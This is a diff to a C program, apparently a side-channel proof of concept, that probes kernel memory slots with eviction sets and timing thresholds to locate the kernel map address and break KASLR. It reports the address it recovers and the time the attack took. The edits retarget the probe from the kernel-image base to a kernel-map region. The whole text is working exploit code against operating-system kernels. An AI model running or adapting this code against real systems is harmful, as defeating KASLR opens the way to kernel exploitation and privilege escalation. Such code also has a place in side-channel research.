@@ -81,7 +81,7 @@ int main(int argc, char *argv[]) {
   for (int i = 0; i < ITERATION; i++) {
     for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
       idx = (s_idx * 73) % NUM_SLOT;
-      addr = (void *)KER_START + (ALIGN_SIZE * idx);
+      addr = (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * idx);
       target[TRAINING_ITERS - 1] = addr;
       gen_eset(addr, eset, &eset_data[0]);
       do {
@@ -96,9 +96,10 @@ int main(int argc, char *argv[]) {
   }
 
   uint64_t valid_page_cnt = 0;
-  void *end_data_addr = 0;
-  uint64_t kern_size_slot = KER_SIZE / ALIGN_SIZE;
+  void *end_kern_map_addr = 0;
+  uint64_t kern_size_slot = KERN_MAP_SIZE / ALIGN_SIZE;
 
+  // TODO make sure all 10 last pages are mapped
   for (uint64_t s_idx = 0; s_idx < NUM_SLOT; s_idx++) {
     if (res[s_idx] / ITERATION > threshold) {
       valid_page_cnt++;
@@ -107,7 +108,8 @@ int main(int argc, char *argv[]) {
         for (int s_jdx = s_idx + kern_size_slot; s_jdx > 0; s_jdx--) {
           if (res[s_jdx] / ITERATION > threshold) {
             if (valid_page_cnt == 0) {
-              end_data_addr = (void *)KER_START + (ALIGN_SIZE * s_jdx);
+              end_kern_map_addr =
+                  (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * s_jdx);
               valid_page_cnt++;
             } else if (valid_page_cnt > 10) {
               break;
@@ -131,20 +133,20 @@ int main(int argc, char *argv[]) {
   double end = (tv_e.tv_sec) * 1000 + (tv_e.tv_usec) / 1000.0;
   double diff = (end - start) / 1000.0;
 
-  void *kernel_addr = end_data_addr - DATA_END_OFFSET + 0x4000;
+  void *kernel_map_addr = end_kern_map_addr - KERN_MAP_SIZE - 0x1000;
 
 #ifdef __DEBUG
   char *dfp = fopen(RESULT_FILE, "w");
-  addr = (void *)KER_START;
+  addr = (void *)KERN_MAP_MIN_ADDR;
   for (uint64_t x = 0; x < NUM_SLOT; x++) {
-    addr = (void *)KER_START + (ALIGN_SIZE * x);
+    addr = (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * x);
     fprintf(dfp, "0x%llx %llu\n", addr, res[x] / ITERATION);
   }
-  fprintf(dfp, "0x%llx\n", kernel_addr);
+  fprintf(dfp, "0x%llx\n", kernel_map_addr);
   fclose(dfp);
 #endif
 
-  printf("kernel base addr\t= \033[1;31m0x%llx\033[0m\n", kernel_addr);
+  printf("kernel map addr\t= \033[1;31m0x%llx\033[0m\n", kernel_map_addr);
   printf("Time to break KASLR\t= %.2fs\n", diff);
   printf("==============================================\n");
   stop_timer();
